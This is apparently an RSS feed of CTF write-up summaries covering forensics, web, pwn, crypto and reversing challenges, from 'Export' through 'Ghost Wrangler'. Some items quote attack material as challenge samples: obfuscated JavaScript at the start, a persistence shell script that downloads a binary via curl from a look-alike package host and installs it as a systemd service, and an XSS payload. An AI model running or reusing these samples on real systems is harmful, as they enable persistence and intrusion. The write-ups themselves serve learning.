_0x4d3ebf[_0x124e('0x6')](_0x124e('0x5')) return _0x589f03 } let binary = '' let for_future_me = _0x124e('0x7') let output = [] for (let i = 0x0; i &amp;lt; binary[_0x124e('0x8')]; i++) { let c = binary[_0x124e('0x9')](i)[_0x124e('0xa')](0x0) let d = ((c &amp;amp; 0x3) &amp;lt;&amp;lt; 0x3) | (c &amp;gt;&amp;gt; 0x2) output['push'](d) } let o = +new Date() + ',' + output[_0x124e('0xb')](0x0, password_length) ['toString']() [_0x124e('0xc')](/,/g, '') [_0x124e('0xd')](0x0, password_length) let noxc = _0x124e('0xe') let _global = global let key = _global['process'] _global[_0x124e('0xf')] = decrypt throw [key[_0x124e('0x10')][0x2] || o, algorithm, _global, noxc] } catch (_0x59227e) { try { let __ = _0x59227e[0x2][_0x124e('0xf')]( _0x59227e[0x3], _0x59227e[0x1], _0x59227e[0x0] ) console[_0x124e('0x11')](__) } catch (_0x79425a) {} } JavaScript deobfuscation We can use Node.</description></item><item><title>Export</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/export/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/export/</guid><description>We are given a memory dump called WIN-LQS146OE2S1-20201027-142607.raw:
$ file WIN-LQS146OE2S1-20201027-142607.raw WIN-LQS146OE2S1-20201027-142607.raw: data Reading the name we can assume it comes from a Windows machine.
Memory dump analysis Let&amp;rsquo;s use volatility to analyze it (I will use a Docker image for that):
$ docker run --rm -v "${PWD}":/project --entrypoint /bin/bash -it phocean/volatility vol@6c13ee800d5a:/volatility$ cd /project vol@6c13ee800d5a:/project$ python /volatility/vol.py -f WIN-LQS146OE2S1-20201027-142607.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search.</description></item><item><title>ExpressionalRebel</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/expressionalrebel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/expressionalrebel/</guid><description>We have a website that evaluates some given Content Security Policy (CSP) restrictions:
Source code analysis We also have the source project, which is a Node.js Express web application. We can see some routes in routes/api.js:
const express = require('express') const router = express.Router() const { evaluateCsp } = require('../utils') router.post('/evaluate', async (req, res) =&amp;gt; { const { csp } = req.body try { const cspIssues = await evaluateCsp(csp) res.json(cspIssues) } catch (error) { res.</description></item><item><title>Extraterrestrial Persistence</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/extraterrestrial-persistence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/extraterrestrial-persistence/</guid><description>We are given a shell script called persistence.sh:
n=`whoami` h=`hostname` path='/usr/local/bin/service' if [[ "$n" != "pandora" &amp;amp;&amp;amp; "$h" != "linux_HQ" ]]; then exit; fi curl https://files.pypi-install.com/packeges/service -o $path chmod +x $path echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode &amp;gt; /usr/lib/systemd/system/service.service systemctl enable service.service Shell script analysis It looks like it is checking some values of the machine, then downloading some payload with curl and executing a Base64-encoded string to save it as a service.</description></item><item><title>eyes</title><link>https://7rocky.github.io/en/ctf/other/corctf/eyes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/corctf/eyes/</guid><description>We are given the source code in SageMath that was used to encrypt the flag:
from Crypto.Util.number import bytes_to_long, getPrime # my NEW and IMPROVED secret sharing scheme!! (now with multivariate quadratics) with open('flag.txt', 'rb') as f: flag = f.read() s = bytes_to_long(flag) p = getPrime(len(bin(s))) print(p) F = GF(p) N = 1024 conv = lambda n: matrix(F, N, 1, [int(i) for i in list(bin(n)[2:][::-1].ljust(N, '0'))]) A = random_matrix(F, N, N) for i in range(0, N): for j in range(0, i): A[i, j] = 0 B = random_matrix(F, N, 1) C = matrix(F, [F(s)]) fn = lambda x: (x.</description></item><item><title>Fake News</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/fake-news/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/fake-news/</guid><description>We are given a folder named html with a lot files from a WordPress server:
$ ls index.php wp-activate.php wp-blogs wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php license.txt wp-admin wp-comments-post.php wp-config.php wp-includes wp-login.php wp-signup.php readme.html wp-blog-header.php wp-config-docker.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php Basic inspection Obviously, wp-blogs stands out, so let&amp;rsquo;s examine files that are inside:
$ ls wp-blogs 2022 $ ls wp-blogs/2022/ 11 $ ls wp-blogs/2022/11/ index.php style.css $ du -h wp-blogs/2022/11/* 304K	wp-blogs/2022/11/index.</description></item><item><title>Fake News</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/fake-news/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/fake-news/</guid><description>We are given a folder named html with a lot files from a WordPress server:
$ ls index.php wp-activate.php wp-blogs wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php license.txt wp-admin wp-comments-post.php wp-config.php wp-includes wp-login.php wp-signup.php readme.html wp-blog-header.php wp-config-docker.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php Basic inspection Obviously, wp-blogs stands out, so let&amp;rsquo;s examine files that are inside:
$ ls wp-blogs 2022 $ ls wp-blogs/2022/ 11 $ ls wp-blogs/2022/11/ index.php style.css $ du -h wp-blogs/2022/11/* 304K	wp-blogs/2022/11/index.</description></item><item><title>Farfour Post Quantom</title><link>https://7rocky.github.io/en/ctf/other/securinets-ctf/farfour-post-quantom/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/securinets-ctf/farfour-post-quantom/</guid><description>We are given the Python source code of a server:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import hashlib from os import urandom from random import SystemRandom from sympy import GF from sympy.polys.matrices import DomainMatrix import json from hashlib import md5 random=SystemRandom() shuffle=random.shuffle randint=random.randint randrange=random.randrange uniform = lambda: randrange(257//2) - 257//2 P=GF(257) secret=open("Secret.txt",'rb').read() assert len(secret)==16 flag=open("flag.txt","rb").read() def encrypt_flag(secret): key = hashlib.sha256(secret).digest()[-16:] iv = urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) enc_flag=cipher.</description></item><item><title>Fast Carmichael</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/fast-carmichael/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/fast-carmichael/</guid><description>We got the Python source code of the server:
from secret import FLAG from Crypto.Util.number import isPrime import socketserver import signal class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5) + 1, 2): if basis[i]: basis[i * i::2 * i] = [False] * ((n - i * i - 1) // (2 * i) + 1) return [2] + [i for i in range(3, n, 2) if basis[i]] def millerRabin(n, b): basis = generate_basis(300) if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for b in basis: x = pow(b, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True def _isPrime(p): if p &amp;lt; 1: return False if (p.</description></item><item><title>Fast Carmichael</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/fast-carmichael/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/fast-carmichael/</guid><description>We got the Python source code of the server:
from secret import FLAG from Crypto.Util.number import isPrime import socketserver import signal class Handler(socketserver.BaseRequestHandler): def handle(self): signal.alarm(0) main(self.request) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def sendMessage(s, msg): s.send(msg.encode()) def receiveMessage(s, msg): sendMessage(s, msg) return s.recv(4096).decode().strip() def generate_basis(n): basis = [True] * n for i in range(3, int(n**0.5) + 1, 2): if basis[i]: basis[i * i::2 * i] = [False] * ((n - i * i - 1) // (2 * i) + 1) return [2] + [i for i in range(3, n, 2) if basis[i]] def millerRabin(n, b): basis = generate_basis(300) if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for b in basis: x = pow(b, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True def _isPrime(p): if p &amp;lt; 1: return False if (p.</description></item><item><title>Fasting</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/fasting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/fasting/</guid><description>We are given a host puzzler7.imaginaryctf.org:5005. If we send a GET request using curl, we have this response:
$ curl puzzler7.imaginaryctf.org:5005 {"api_message":"Yet another sourceless web..."} $ curl -i puzzler7.imaginaryctf.org:5005 HTTP/1.1 200 OK date: server: uvicorn content-length: 47 content-type: application/json {"api_message":"Yet another sourceless web..."} Using ffuf, we discover endpoints docs and redoc:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://puzzler7.imaginaryctf.org:5005/FUZZ docs [Status: 200, Size: 931, Words: 150, Lines: 31, Duration: 114ms] redoc [Status: 200, Size: 891, Words: 176, Lines: 31, Duration: 111ms] [Status: 200, Size: 47, Words: 4, Lines: 1, Duration: 111ms] Both of them are supposed to document API endpoints for people who want to consume the API:</description></item><item><title>Favela Ransomware</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/favela-ransomware/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/favela-ransomware/</guid><description>In this challenge we have a Windows PE called favela_ransom.exe along with other files that are part of a ransomware attack, together with the encrypted files that we have to recover:
$ file * diary.txt: data favela_ransom.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows flag.enc: data lia sikora desnuda.jpg: data note.txt: Unicode text, UTF-8 text ransomed.png: PNG image data, 2643 x 1580, 8-bit/color RGBA, non-interlaced Reverse engineering When opening the executable in Ghidra, and looking at the strings, we see a curious one that points to a GitHub Gist: https://gist.</description></item><item><title>Favorite Color</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/favorite-color/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/favorite-color/</guid><description>We are given a server to connect using SSH. There is a 32-bit binary called color that is SGID:
color@ubuntu-512mb-nyc3-01:~$ ls -l total 20 -r--r--r-- 1 root root 714 Sep 12 2017 Makefile -r-xr-sr-x 1 root color_pwn 7672 Sep 12 2017 color -r--r--r-- 1 root root 722 Sep 12 2017 color.c -r--r----- 1 root color_pwn 24 Sep 12 2017 flag.txt color@ubuntu-512mb-nyc3-01:~$ file color color: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.</description></item><item><title>fermat-strings</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/fermat-strings/</guid><description>We are given a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Static code analysis We also have the C source code. Basically, what the program does is request two numbers and try to find one that breaks Fermat&amp;rsquo;s Last Theorem.
As a reminder, Fermat&amp;rsquo;s Last Theorem claims that there are no positive integers $a$, $b$, $c$, that satisfy the equation:</description></item><item><title>Fibopadcci</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/fibopadcci/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/fibopadcci/</guid><description>We are given the Python source code of the server:
import socketserver from Crypto.Cipher import AES import os from secret import flag, key fib = [1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 121, 98, 219, 61] wlc_msg = """ ------------------------------------------------------------------------- | Welcome to my Super Secure Encryption service! | | We use AES along with custom padding for authentication | | for extra security, so only admins should be able to | | decrypt the flag with the key I have provided them!</description></item><item><title>FileStorage</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/filestorage/</guid><description>This challenge was made by me for Hack The Box. We are given a 64-bit binary called file_storage:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We see that it has NX enabled, so we cannot execute custom shellcode on the stack directly. Moreover, it has Partial RELRO, which means that the Global Offset Table (GOT) can be modified in some ways.</description></item><item><title>filtered-shellcode</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/filtered-shellcode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/filtered-shellcode/</guid><description>We are given a 32-bit binary called fun:
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments We do not have the C source code. This time, instead of reversing the binary using tools like Ghidra, we will analyze it with GDB.
First let&amp;rsquo;s execute the program:
$ ./fun Give me code to run: asdf zsh: segmentation fault (core dumped) .</description></item><item><title>Finale</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/</guid><description>We are given a 64-bit binary called finale:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Environment setup It might happen that we don&amp;rsquo;t have a version of Glibc that is accepted by the program:
$ ./finale ./finale: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./finale) Luckily, in Spooky Time we were provided with a library and a loader, version 2.35:
$ .</description></item><item><title>Finale</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/finale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/finale/</guid><description>We are given a 64-bit binary called finale:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Environment setup It might happen that we don&amp;rsquo;t have a version of Glibc that is accepted by the program:
$ ./finale ./finale: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./finale) Luckily, in Spooky Time we were provided with a library and a loader, version 2.35:
$ .</description></item><item><title>Find Marher's Secret</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/find-marhers-secret/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/find-marhers-secret/</guid><description>We are given a some Python source code and a server to connect to:
$ nc 161.35.172.25 32275 Connected to the cyborg's debugging interface Options: 1. Encrypt your text. 2. Claim the key. &amp;gt; Static code analysis This is the relevant part of the code:
def challenge(req): key = bytes.fromhex(KEY) assert(len(key) == 27) req.sendall(b'Connected to the cyborg\'s debugging interface\n') while True: req.sendall( b'\nOptions:\n1. Encrypt your text.\n2. Claim the key.\n&amp;gt; ') try: response = json.</description></item><item><title>Find The Easy Pass</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/find-the-easy-pass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/find-the-easy-pass/</guid><description>We have a 32-bit binary called EasyPass.exe which is a Windows PE file:
$ file EasyPass.exe EasyPass.exe: PE32 executable (GUI) Intel 80386, for MS Windows If we execute the binary in a Windows machine, it will a password:
Since the password is wrong, we will see a message &amp;ldquo;Wrong Password!&amp;rdquo;:
A static code analysis with Ghidra won&amp;rsquo;t be useful. Hence, let&amp;rsquo;s use a debugger like x32dbg to debug the binary. Once it is open, we can search for the previous error string:</description></item><item><title>fizzbuzz100</title><link>https://7rocky.github.io/en/ctf/other/corctf/fizzbuzz100/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/corctf/fizzbuzz100/</guid><description>We are given the Python source code that is running on a server:
#!/usr/local/bin/python from Crypto.Util.number import * from os import urandom flag = open("flag.txt", "rb").read() flag = bytes_to_long(urandom(16) + flag + urandom(16)) p = getPrime(512) q = getPrime(512) n = p * q e = 0x10001 d = pow(e, -1, (p-1)*(q-1)) assert flag &amp;lt; n ct = pow(flag, e, n) print(f"{n = }") print(f"{e = }") print(f"{ct = }") while True: ct = int(input("</description></item><item><title>fizzbuzz101</title><link>https://7rocky.github.io/en/ctf/other/corctf/fizzbuzz101/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/corctf/fizzbuzz101/</guid><description>We are given the Python source code that is running on a server:
#!/usr/local/bin/python from Crypto.Util.number import * from os import urandom flag = open("flag.txt", "rb").read() flag = bytes_to_long(urandom(16) + flag + urandom(16)) p = getPrime(512) q = getPrime(512) n = p * q e = 0x10001 d = pow(e, -1, (p-1)*(q-1)) assert flag &amp;lt; n ct = pow(flag, e, n) print(f"{n = }") print(f"{e = }") print(f"{ct = }") while True: ct = int(input("</description></item><item><title>fizzbuzz102</title><link>https://7rocky.github.io/en/ctf/other/corctf/fizzbuzz102/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/corctf/fizzbuzz102/</guid><description>We are given the Python source code that is running on a server:
#!/usr/local/bin/python from Crypto.Util.number import * from os import urandom from secrets import randbits flag = open("flag.txt", "rb").read() flag = bytes_to_long(urandom(16) + flag + urandom(16)) p = getPrime(512) q = getPrime(512) n = p * q e = 0x10001 d = pow(e, -1, (p-1)*(q-1)) assert flag &amp;lt; n ct = pow(flag, e, n) a = randbits(845) b = randbits(845) def lcg(x): return (a * x + b) % n print(f"</description></item><item><title>Fleet Management</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/fleet-management/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/fleet-management/</guid><description>We are given a 64-bit binary called fleet_management:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled If we open it in Ghidra, we will see this main function:
int main() { setup(); fprintf(stdout, "%s %s Fleet Management System %s\n", &amp;amp;DAT_001023e5, &amp;amp;DAT_001020e9, &amp;amp;DAT_001023e0); fprintf(stdout, "\n%s[*] Loading . . .\n%s", &amp;amp;DAT_001020f1, &amp;amp;DAT_001020e9); sleep(2); menu(); return 0; } It calls menu:
void menu() { long in_FS_OFFSET; undefined8 uVar1; char local_13 [3]; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); memset(local_13, 0, 3); do { fwrite("</description></item><item><title>Fleeting</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/fleeting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/fleeting/</guid><description>We are given this short Python code to encrypt the flag, and also the ciphertext as a comment:
print((f:=lambda s:s and[s[0]^s[-1],*f(s[::-1][1:])])([*open('flag','rb')][0])) #[20, 37, 47, 47, 56, 52, 38, 46, 51, 56, 23, 58, 57, 50, 86, 95, 95, 103, 0] Source code analysis If we analyze the code, we will see that it is defining a lambda function named f and calling it with the contents of the flag in bytes:</description></item><item><title>Flippin Bank</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/flippin-bank/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/flippin-bank/</guid><description>We are given the Python source code of the server:
import socketserver import socket, os from Crypto.Cipher import AES from Crypto.Util.Padding import pad,unpad from Crypto.Random import get_random_bytes from binascii import unhexlify from secret import FLAG wlcm_msg ='########################################################################\n'+\ '# Welcome to the Bank of the World #\n'+\ '# All connections are monitored and recorded #\n'+\ '# Disconnect IMMEDIATELY if you are not an authorized user! #\n'+\ '########################################################################\n' key = get_random_bytes(16) iv = get_random_bytes(16) def encrypt_data(data): padded = pad(data.</description></item><item><title>fno-stack-protector</title><link>https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/</guid><description>We are given a 64-bit binary called main:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled If we open the binary in Ghidra we see these functions:
void bad_function() { execve("/bin/sh", NULL, NULL); } void vuln() { char data[10]; read(0, data, 170); } int main() { setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return 0; } There exists a Buffer Overflow vulnerability.</description></item><item><title>Forensics 101</title><link>https://7rocky.github.io/en/ctf/ctflearn/forensics/forensics-101/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/forensics/forensics-101/</guid><description>We are told to find the flag in this image:
However, the flag is not visible inside the image and it is not hidden in its content. However, we can find the flag in the file raw content.
In order to extract printable characters from the image we can use strings and then filter by CTFlearn piping the previous command to grep:
$ strings 95f6edfb66ef42d774a5a34581f19052.jpg | grep CTFlearn CTFlearn{wow!_data_is_cool}</description></item><item><title>Format</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/</guid><description>We are given a 64-bit binary called format:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Reverse engineering After executing it, we see that the program only echoes what we enter:
$ ./format asdf asdf fdsa fdsa Using Ghidra, we can reverse engineer the source code and see what the program is doing:
int main(EVP_PKEY_CTX *param_1) { long canary; long in_FS_OFFSET; canary = *(long *) (in_FS_OFFSET + 0x28); init(param_1); echo(); if (canary !</description></item><item><title>Free Services</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/free-services/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/free-services/</guid><description>We are given a Microsoft Office Excel file named free_decryption.xlsm. The m in the extension points out that the file has VBA macros inside.
VBA macros extraction Nevertheless, olevba from oletools is not able to extract the VBA code:
$ olevba free_decryption.xlsm olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools =============================================================================== FILE: free_decryption.xlsm Type: OpenXML No VBA or XLM macros found. So, we will need to open the file (and disable macros).</description></item><item><title>fs0ciety</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/fs0ciety/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/fs0ciety/</guid><description>We are given a ZIP file called fsociety.zip:
$ unzip -v fsociety.zip Archive: fsociety.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 729 Defl:N 186 75% 08-15-2017 17:44 e126a116 sshcreds_datacenter.txt -------- ------- --- ------- 729 186 75% 1 file We see that it is password-protected:
$ unzip fsociety.zip Archive: fsociety.zip [fsociety.zip] sshcreds_datacenter.txt password: Hence, we can try to perform a brute force attack using rockyou.</description></item><item><title>Full Stack Conf</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/full-stack-conf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/full-stack-conf/</guid><description>We are provided with this webpage:
At the bottom of the page we have a text input:
If we provide some data, we see a message:
However, the website tells us to pop an alert(). This is usually a proof of concept for Cross-Site Scripting (XSS) payloads. One of the simplest payloads for XSS is:
&amp;lt;img src=x onerror=alert(1)&amp;gt; If we use it, we will see the flag in the alert (HTB{p0p.</description></item><item><title>Funds Secured</title><link>https://7rocky.github.io/en/ctf/htb-challenges/blockchain/funds-secured/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/blockchain/funds-secured/</guid><description>We are given a Solidity file called Campaign.sol:
// SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.18; import {ECDSA} from "./lib/ECDSA.sol"; /// @notice MultiSignature wallet used to end the Crowdfunding and transfer the funds to a desired address contract CouncilWallet { using ECDSA for bytes32; address[] public councilMembers; /// @notice Register the 11 council members in the wallet constructor(address[] memory members) { require(members.length == 11); councilMembers = members; } /// @notice Function to close crowdfunding campaign.</description></item><item><title>funnylogin</title><link>https://7rocky.github.io/en/ctf/other/dicectf/funnylogin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/dicectf/funnylogin/</guid><description>We are given a Node.js project with a single app.js file:
const express = require('express'); const crypto = require('crypto'); const app = express(); const db = require('better-sqlite3')('db.sqlite3'); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY, username TEXT, password TEXT );`); const FLAG = process.env.FLAG || "dice{test_flag}"; const PORT = process.env.PORT || 3000; const users = [...Array(100_000)].map(() =&amp;gt; ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") })); db.exec(`INSERT INTO users (id, username, password) VALUES ${users.</description></item><item><title>Gawk</title><link>https://7rocky.github.io/en/ctf/htb-challenges/hardware/gawk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/hardware/gawk/</guid><description>We are told that someone needs help with a printer. We only have an IP address and a port. nmap does not show any useful information:
$ nmap -Pn -sV 167.99.207.74 -p 32108 Starting Nmap 7.93 ( https://nmap.org ) Nmap scan report for 167.99.207.74 Host is up (0.079s latency). PORT STATE SERVICE VERSION 32108/tcp open unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.</description></item><item><title>GET aHEAD</title><link>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/get-ahead/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/web-exploitation/get-ahead/</guid><description>We are given a website that shows two background colors:
The red button uses a GET request and the blue one uses a POST request. We do not see anything.
Since the challenge name includes HEAD, let&amp;rsquo;s see if we can perform a HEAD request using curl:
$ curl -I mercury.picoctf.net:47967 HTTP/1.1 200 OK flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3} Content-type: text/html; charset=UTF-8</description></item><item><title>Getting Started</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/getting-started/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/getting-started/</guid><description>We are asked to exploit a basic Buffer Overflow vulnerability. We are given some indications and examples as well:
$ nc 178.62.11.21 31609 Stack frame layout | . | &amp;lt;- Higher addresses | . | |_____________| | | &amp;lt;- 64 bytes | Return addr | |_____________| | | &amp;lt;- 56 bytes | RBP | |_____________| | | &amp;lt;- 48 bytes | target | |_____________| | | &amp;lt;- 40 bytes | alignment | |_____________| | | &amp;lt;- 32 bytes | Buffer[31] | |_____________| | .</description></item><item><title>Ghost Wrangler</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/ghost-wrangler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/ghost-wrangler/</guid><description>We are given a binary file called ghost:
$ file ghost ghost: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=810d0f9271ec04d80a2eee6ff2afd9367da3c3dd, for GNU/Linux 3.2.0, not stripped Reverse engineering If we open the binary in Ghidra, we will see this decompiled main function in C:
